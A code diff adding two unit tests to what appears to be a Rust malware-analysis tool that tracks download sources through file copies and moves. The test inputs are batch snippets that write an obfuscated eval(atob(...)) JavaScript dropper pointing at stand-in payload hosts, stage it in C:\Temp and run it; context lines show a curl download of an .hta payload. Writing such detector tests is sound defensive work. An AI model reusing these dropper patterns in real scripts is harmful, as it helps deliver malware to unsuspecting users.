@@ -24647,6 +24647,24 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copy_to_tracked_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
+mkdir C:\Temp
+copy /y original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copy-tracked-dir.example/payload")
+            }),
+            "copy to tracked directory did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn move_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://move-download.example/payload.hta
@@ -24698,6 +24716,24 @@ call C:\Temp\original.js"#,
                 matches!(t, Trait::Download { src, .. } if src == "https://move-dir-js.example/payload")
             }),
             "move directory destination did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn move_to_tracked_directory_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
+mkdir C:\Temp
+move /y original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://move-tracked-dir.example/payload")
+            }),
+            "move to tracked directory did not preserve generated JS content: {:?}",
             report.traits
         );
     }
